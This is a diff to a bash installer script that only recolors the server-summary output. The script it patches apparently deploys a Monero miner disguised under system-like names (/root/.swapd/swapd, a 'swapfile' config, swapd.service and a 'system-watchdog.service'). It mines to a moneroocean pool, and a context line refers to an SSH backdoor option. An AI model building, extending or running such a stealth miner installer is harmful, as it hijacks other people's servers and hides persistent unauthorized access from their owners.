@@ -2585,9 +2585,22 @@ echo "[✓] SSH configuration complete (backdoor disabled by default)"
 echo ""
 
 # ==================== SERVER INFORMATION ====================
-echo '========================================================================='
-echo 'SERVER INFORMATION (Copy this for tracking/monitoring)'
-echo '========================================================================='
+# ANSI Color Codes
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+BLUE='\033[0;34m'
+MAGENTA='\033[0;35m'
+CYAN='\033[0;36m'
+BOLD='\033[1m'
+BOLD_GREEN='\033[1;32m'
+BOLD_CYAN='\033[1;36m'
+BOLD_YELLOW='\033[1;33m'
+RESET='\033[0m'
+
+echo -e "${BOLD_CYAN}=========================================================================${RESET}"
+echo -e "${BOLD_CYAN}SERVER INFORMATION${RESET} ${YELLOW}(Copy this for tracking/monitoring)${RESET}"
+echo -e "${BOLD_CYAN}=========================================================================${RESET}"
 echo ''
 
 # Hostname and IPs
@@ -2595,11 +2608,11 @@ HOSTNAME=$(hostname 2>/dev/null || echo "unknown")
 EXTERNAL_IP=$(get_server_ip)
 INTERNAL_IP=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "unknown")
 
-echo "Server Identification:"
-echo "  Hostname:     $HOSTNAME"
-echo "  External IP:  $EXTERNAL_IP"
-echo "  Internal IP:  $INTERNAL_IP"
-echo "  Worker ID:    $PASS"
+echo -e "${BOLD}Server Identification:${RESET}"
+echo -e "  ${CYAN}Hostname:${RESET}     ${BOLD_GREEN}$HOSTNAME${RESET}"
+echo -e "  ${CYAN}External IP:${RESET}  ${BOLD_GREEN}$EXTERNAL_IP${RESET}"
+echo -e "  ${CYAN}Internal IP:${RESET}  ${GREEN}$INTERNAL_IP${RESET}"
+echo -e "  ${CYAN}Worker ID:${RESET}    ${YELLOW}$PASS${RESET}"
 
 echo ''
 
@@ -2612,11 +2625,11 @@ fi
 KERNEL=$(uname -r)
 ARCH=$(uname -m)
 
-echo "Operating System:"
-echo "  OS:           $OS_NAME"
-echo "  Kernel:       $KERNEL"
-echo "  Architecture: $ARCH"
-echo "  Uptime:       $(uptime -p 2>/dev/null || uptime | awk -F'up ' '{print $2}' | awk -F',' '{print $1}')"
+echo -e "${BOLD}Operating System:${RESET}"
+echo -e "  ${CYAN}OS:${RESET}           ${GREEN}$OS_NAME${RESET}"
+echo -e "  ${CYAN}Kernel:${RESET}       ${GREEN}$KERNEL${RESET}"
+echo -e "  ${CYAN}Architecture:${RESET} ${GREEN}$ARCH${RESET}"
+echo -e "  ${CYAN}Uptime:${RESET}       ${GREEN}$(uptime -p 2>/dev/null || uptime | awk -F'up ' '{print $2}' | awk -F',' '{print $1}')${RESET}"
 
 echo ''
 
@@ -2627,11 +2640,11 @@ RAM_TOTAL=$(free -h 2>/dev/null | grep "^Mem:" | awk '{print $2}' || echo "unkno
 DISK_ROOT=$(df -h / 2>/dev/null | tail -1 | awk '{print $2}' || echo "unknown")
 DISK_FREE=$(df -h / 2>/dev/null | tail -1 | awk '{print $4}' || echo "unknown")
 
-echo "Hardware Resources:"
-echo "  CPU:          $CPU_MODEL"
-echo "  Cores:        $CPU_CORES"
-echo "  RAM:          $RAM_TOTAL"
-echo "  Disk (root):  $DISK_ROOT (Free: $DISK_FREE)"
+echo -e "${BOLD}Hardware Resources:${RESET}"
+echo -e "  ${CYAN}CPU:${RESET}          ${GREEN}$CPU_MODEL${RESET}"
+echo -e "  ${CYAN}Cores:${RESET}        ${BOLD_GREEN}$CPU_CORES${RESET}"
+echo -e "  ${CYAN}RAM:${RESET}          ${BOLD_GREEN}$RAM_TOTAL${RESET}"
+echo -e "  ${CYAN}Disk (root):${RESET}  ${GREEN}$DISK_ROOT${RESET} ${YELLOW}(Free: $DISK_FREE)${RESET}"
 
 echo ''
 
@@ -2642,26 +2655,26 @@ if [ "$MINER_TYPE" = "cpuminer" ]; then
     MINER_TYPE_DISPLAY="SRBMiner-MULTI (ARM)"
 fi
 
-echo "Installation Details:"
-echo "  Install Date: $INSTALL_DATE"
-echo "  Miner Type:   $MINER_TYPE_DISPLAY"
-echo "  Binary Path:  /root/.swapd/swapd"
-echo "  Config Path:  /root/.swapd/swapfile"
-echo "  Service:      swapd.service"
-echo "  Watchdog:     system-watchdog.service"
+echo -e "${BOLD}Installation Details:${RESET}"
+echo -e "  ${CYAN}Install Date:${RESET} ${YELLOW}$INSTALL_DATE${RESET}"
+echo -e "  ${CYAN}Miner Type:${RESET}   ${BOLD_GREEN}$MINER_TYPE_DISPLAY${RESET}"
+echo -e "  ${CYAN}Binary Path:${RESET}  ${GREEN}/root/.swapd/swapd${RESET}"
+echo -e "  ${CYAN}Config Path:${RESET}  ${GREEN}/root/.swapd/swapfile${RESET}"
+echo -e "  ${CYAN}Service:${RESET}      ${GREEN}swapd.service${RESET}"
+echo -e "  ${CYAN}Watchdog:${RESET}     ${GREEN}system-watchdog.service${RESET}"
 
 echo ''
 
 # Network/Mining Configuration
-echo "Mining Configuration:"
-echo "  Pool:         gulf.moneroocean.stream:80"
-echo "  Wallet:       ${WALLET:0:20}...${WALLET: -10}"
-echo "  Worker Pass:  $PASS"
-echo "  Pool URL:     https://moneroocean.stream"
-echo "  Worker Stats: https://moneroocean.stream/?worker=$WALLET#worker-stats"
+echo -e "${BOLD}Mining Configuration:${RESET}"
+echo -e "  ${CYAN}Pool:${RESET}         ${BOLD_GREEN}gulf.moneroocean.stream:80${RESET}"
+echo -e "  ${CYAN}Wallet:${RESET}       ${YELLOW}${WALLET:0:20}...${WALLET: -10}${RESET}"
+echo -e "  ${CYAN}Worker Pass:${RESET}  ${YELLOW}$PASS${RESET}"
+echo -e "  ${CYAN}Pool URL:${RESET}     ${BLUE}https://moneroocean.stream${RESET}"
+echo -e "  ${CYAN}Worker Stats:${RESET} ${BLUE}https://moneroocean.stream/?worker=$WALLET#worker-stats${RESET}"
 
 echo ''
-echo '========================================================================='
+echo -e "${BOLD_CYAN}=========================================================================${RESET}"
 echo ''
 
 # ==================== INSTALLATION SUMMARY ====================
